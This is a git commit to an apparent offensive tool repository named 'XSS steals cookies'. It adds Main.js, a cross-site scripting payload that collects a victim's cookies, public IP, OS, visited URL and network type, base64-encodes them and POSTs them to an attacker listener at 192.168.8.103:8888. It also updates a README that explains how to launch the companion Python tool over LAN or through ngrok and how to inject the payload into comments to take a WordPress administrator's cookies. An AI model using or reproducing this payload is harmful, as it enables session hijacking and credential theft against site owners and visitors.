e52cc34892858cf156fea4504c9654fcee059e14
MartinxMax <280901844@qq.com>
2023-01-07 20:05:46 +0800

    2023/1/7

---
+++ Main.js
@@ -0,0 +1,111 @@
+var User_Infor = {
+    IP:null,
+    Host_Type:null,
+    Cookies:null,
+    Time:null,
+    Visit_URL:null,
+    NetWork:null
+}; 
+function getNetworkType() {
+    var ua = navigator.userAgent;
+    var networkStr = ua.match(/NetType\/\w+/) ? ua.match(/NetType\/\w+/)[0] : 'NetType/other';
+    networkStr = networkStr.toLowerCase().replace('nettype/', '');
+    var networkType;
+    switch (networkStr) {
+        case 'wifi':
+            networkType = 'wifi';
+            break;
+        case '4g':
+            networkType = '4g';
+            break;
+        case '3g':
+            networkType = '3g';
+            break;
+        case '3gnet':
+            networkType = '3g';
+            break;
+        case '2g':
+            networkType = '2g';
+            break;
+        default:
+            networkType = 'other';
+    }
+    return networkType;
+}
+function getCusIpAdress(){
+    var data;
+    let xmlHttpRequest;
+    if(window.ActiveXObject){
+        xmlHttpRequest = new ActiveXObject("Microsoft.XMLHTTP");
+    }else if(window.XMLHttpRequest){
+        xmlHttpRequest = new XMLHttpRequest();
+    }
+    xmlHttpRequest.onreadystatechange=function(){
+        if(xmlHttpRequest.readyState == 4){
+            if(xmlHttpRequest.status == 200) {
+                data=xmlHttpRequest .responseText;
+            }
+            else{
+                data=null;
+            }
+        }
+    };
+    xmlHttpRequest.open("get", "https://api4.ipify.org/?format=text", false);
+    xmlHttpRequest.send(null);
+    return data;
+}
+ 
+
+function browserRedirect(){
+    var sUserAgent = navigator.userAgent;
+    var isWin = (navigator.platform == "Win32") || (navigator.platform == "Windows");
+    var isMac = (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel");
+    if (isMac) return "Mac";
+    var isUnix = (navigator.platform == "X11") && !isWin && !isMac;
+    if (isUnix) return "Unix";
+    var isLinux = (String(navigator.platform).indexOf("Linux") > -1);
+    if (isLinux) {
+        var isAndroid = sUserAgent.indexOf("Android") > -1 ;
+        if (isAndroid) return "Android Mobile"; 
+        else return "Linux";
+    }
+  
+    if (isWin) {
+        var isWin2K = sUserAgent.indexOf("Windows NT 5.0") > -1 || sUserAgent.indexOf("Windows 2000") > -1;
+        if (isWin2K) return "Win2000";
+        var isWinXP = sUserAgent.indexOf("Windows NT 5.1") > -1 || sUserAgent.indexOf("Windows XP") > -1;
+        if (isWinXP) return "WinXP";
+        var isWin2003 = sUserAgent.indexOf("Windows NT 5.2") > -1 || sUserAgent.indexOf("Windows 2003") > -1;
+        if (isWin2003) return "Win2003";
+        var isWinVista= sUserAgent.indexOf("Windows NT 6.0") > -1 || sUserAgent.indexOf("Windows Vista") > -1;
+        if (isWinVista) return "WinVista";
+        var isWin7 = sUserAgent.indexOf("Windows NT 6.1") > -1 || sUserAgent.indexOf("Windows 7") > -1;
+        if (isWin7) return "Win7";
+        var isWin10 = sUserAgent.indexOf("Windows NT 10") > -1 || sUserAgent.indexOf("Windows 10") > -1;
+        if (isWin10) return "Win10";
+    }
+    return "other";
+  }
+
+function DATA_Packet(DATA){
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST","http://192.168.8.103:8888",true);//Tag
+    xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded;charset=utf-8');
+    xhr.send(JSON.stringify(DATA));
+}
+function Get_Base_Message(){
+    var Info = 
+    // User_Infor['Time']=Encryption(document.cookie)
+    User_Infor['IP']=Encryption(getCusIpAdress());
+    User_Infor['Host_Type']=Encryption(browserRedirect());
+    User_Infor['Visit_URL']=Encryption(document.URL);
+    User_Infor['NetWork']=Encryption(getNetworkType());
+    User_Infor['Time']=Encryption(new Date().toLocaleString()); 
+    User_Infor['Cookies']=Encryption(document.cookie) || null
+    DATA_Packet(User_Infor);
+}
+
+function Encryption(DATA){
+    return btoa(DATA)
+}
+Get_Base_Message();
--- README.md
+++ README.md
@@ -1,45 +1,62 @@
 # XSS steals cookies
-* The current version is 1.0 and will be updated continuously
+* The current version v3.0 is simpler and faster
+* Obtain the victim's Internet IP address
 * Python version 3.6 or above
 * Automatically steal cookies
 * Compatible with Windows or Linux
 ## usage method
   * View help information
 
-      ```#python3 XSS.py -h```
+      ```#python3 XSS_Tool_V3.0.py -h```
 
-  ![图片名称](https://github.com/MartinxMax/XSS_Cookie_Tool-V1.0/blob/master/%C2%96%C2%96Demo_image/Command.png "Help")  
+  ![图片名称](./Demo_image/Help.png "Help")  
 
   * LAN attack
 
-      ```#python3 XSS.py -lp (Local port)```
+      ```#python3 XSS_Tool_V3.0.py -lp (Local port)```
 
   * Internet attack
 
-      ```#python3 XSS.py -t -lp (Local port) -rh (Remote host IP) -rp (Remote host port)```
+      ```#python3 XSS_Tool_V3.0.py -t -lp (Local port) -rh (Remote host IP) -rp (Remote host port)```
 
 ## Effect demonstration 
- * Here, XSS will be demonstrated in the local DVWA shooting range, and cookies will be stolen through the internet
+ * We will use WordPress-6.1.1 for XSS attack simulation test
+ * _If your machine has a public IP address, just listen to the local port_
 
-_If your machine has a public IP address, just listen to the local port_
-
+# Use Extranet attack
 * Enable port forwarding (Ngrok is used for demonstration)
 
-    ![图片名称](https://github.com/MartinxMax/XSS_Cookie_Tool-V1.0/blob/master/%C2%96%C2%96Demo_image/TCP.png "Port forwarding")  
+    ![图片名称](./Demo_image/forwarding.png "Port forwarding")  
 
-* Use Internet attack
+* Use Extranet attack
 
-    ```#python3 XSS.py -t -lp 8080 -rh ***.***.***.*** -rp 10029```
+    ```#python3 XSS_Tool_V3.0.py -t -lp 8080 -rh ***.***.***.*** -rp 10029```
 
-    ![图片名称](https://github.com/MartinxMax/XSS_Cookie_Tool-V1.0/blob/master/%C2%96%C2%96Demo_image/PAYLOAD.png "PAYLOAD")  
-Copy PAYLOAD
+    ![图片名称](./Demo_image/Internet.png "Extranetattack")  
 
-* Attempt to inject statement
-   ![图片名称](https://github.com/MartinxMax/XSS_Cookie_Tool-V1.0/blob/master/%C2%96%C2%96Demo_image/ADMIN.png "Cookie")  
-* Administrator visits malicious page
-  The administrator is redirected to the specified page
 
-  ![图片名称](https://github.com/MartinxMax/XSS_Cookie_Tool-V1.0/blob/master/%C2%96%C2%96Demo_image/redirect.png "page")  
-    
-* Got cookies
-      ![图片名称](https://github.com/MartinxMax/XSS_Cookie_Tool-V1.0/blob/master/%C2%96%C2%96Demo_image/Cookie.png "Cookie")  
+# Use Intranet attack [Now Test]
+* You can use the - lp parameter to specify the port. If you do not write, the default port is 8888
+
+```#python3 XSS_Tool_V3.0.py```
+
+![图片名称](./Demo_image/Runing.png "Run")  
+
+* Copy payload and inject XXS injection point
+
+![图片名称](./Demo_image/Runing.png "Run")  
+
+----------------Server Admin------------------------
+
+* Normal status of administrator
+
+![图片名称](./Demo_image/Admin_no_hack.png "Admin_no_hack")  
+
+* The administrator was hacked to execute malicious code when viewing comments
+
+![图片名称](./Demo_image/Admin_hacked2.png "Admin_hacked2")  
+
+-----------------Hacker--------------------------
+* Hacker gets the administrator's cookie
+
+![图片名称](./Demo_image/Hack_Get_Cookie.png "Hack_Get_Cookie")
